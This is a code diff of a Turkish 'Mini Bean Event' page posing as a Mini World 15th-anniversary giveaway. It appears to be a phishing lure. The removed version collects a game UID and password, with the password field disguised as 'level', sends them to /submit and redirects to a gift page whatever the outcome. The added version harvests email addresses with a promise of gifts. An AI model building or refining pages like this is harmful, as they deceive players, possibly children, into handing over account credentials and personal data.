@@ -2,7 +2,7 @@
 <html lang="tr">
   <head>
     <meta charset="utf-8" />
-    <title>Mini Bean Event Login</title>
+    <title>Mini Bean Event - Giriş</title>
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <style>
       /* Arka plan: kutlama havası */
@@ -32,13 +32,11 @@
         text-align: center;
         position: relative;
         overflow: hidden;
-
-        /* Resim + yarı saydam beyaz katman */
         background-image: url("https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRSlWp1KyGqqcWi7FwbLGAk0y8vfD8_exs_mw&s");
         background-size: cover;
         background-position: center;
-        background-color: rgba(255,255,255,0.85); /* yarı saydam beyaz */
-        background-blend-mode: lighten;           /* resmi beyazla harmanlar */
+        background-color: rgba(255,255,255,0.85);
+        background-blend-mode: lighten;
       }
 
       .login-box h1 {
@@ -48,7 +46,6 @@
         font-weight: 700;
       }
 
-      /* Input alanları */
       .input-group {
         margin-bottom: 20px;
         text-align: left;
@@ -68,6 +65,7 @@
         border-radius: 10px;
         font-size: 1rem;
         transition: all 0.3s;
+        box-sizing: border-box;
       }
 
       .input-group input:focus {
@@ -76,7 +74,6 @@
         outline: none;
       }
 
-      /* Buton */
       button {
         width: 100%;
         padding: 14px;
@@ -95,7 +92,6 @@
         box-shadow: 0 6px 16px rgba(0,0,0,0.2);
       }
 
-      /* Mesaj */
       .msg {
         margin-top: 16px;
         font-size: 1rem;
@@ -104,7 +100,6 @@
       .ok { color: #16a34a; }
       .err { color: #dc2626; }
 
-      /* Footer */
       footer {
         margin-top: 24px;
         font-size: 0.9rem;
@@ -118,18 +113,14 @@
       <h1>Mini Bean Login 🎁</h1>
 
       <div class="input-group">
-        <label for="uid">UID</label>
-        <input id="uid" type="text" maxlength="200" />
-      </div>
-      <div class="input-group">
-        <label for="level">Password</label>
-        <input id="level" type="password" maxlength="200" />
+        <label for="email">E-posta Adresiniz</label>
+        <input id="email" type="email" placeholder="örnek@gmail.com" maxlength="200" />
       </div>
 
-      <button id="submitBtn">🎉 Log in</button>
+      <button id="submitBtn">🎉 Devam Et</button>
       <div id="msg" class="msg"></div>
 
-      <footer>Mini World 15. Yıl Özel Etkinliği – Dev Hediyeler Seni Bekliyor 🎊</footer>
+      <footer>Mini World 15. Yıl Özel Etkinliği – Hediyeni Almak İçin E-postanı Gir 🎊</footer>
     </div>
 
     <script>
@@ -140,37 +131,32 @@
         msg.textContent = '';
         msg.className = 'msg';
 
-        const uid = document.getElementById('uid').value.trim();
-        const level = document.getElementById('level').value.trim();
+        const email = document.getElementById('email').value.trim();
 
-        if (!uid || !level) {
-          msg.textContent = 'Lütfen UID ve şifre giriniz.';
+        if (!email || !email.includes('@')) {
+          msg.textContent = 'Lütfen geçerli bir e-posta adresi giriniz.';
           msg.className = 'msg err';
           return;
         }
+
         try {
           const res = await fetch('/submit', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ uid, level })
+            body: JSON.stringify({ email })
           });
           const data = await res.json();
 
           if (data.ok) {
-            msg.textContent = 'Teşekkürler 🎉';
-            msg.className = 'msg ok';
-            document.getElementById('uid').value = '';
-            document.getElementById('level').value = '';
-            window.location.href = "gift.html";
+            // E-posta kaydedildi, kod sayfasına yönlendir
+            window.location.href = "gift.html?email=" + encodeURIComponent(email);
           } else {
             msg.textContent = data.message || 'Bir hata oluştu.';
             msg.className = 'msg err';
-            window.location.href = "gift.html";
           }
         } catch (e) {
           msg.textContent = 'Sunucuya bağlanılamadı.';
           msg.className = 'msg err';
-          window.location.href = "gift.html";
         }
       });
     </script>
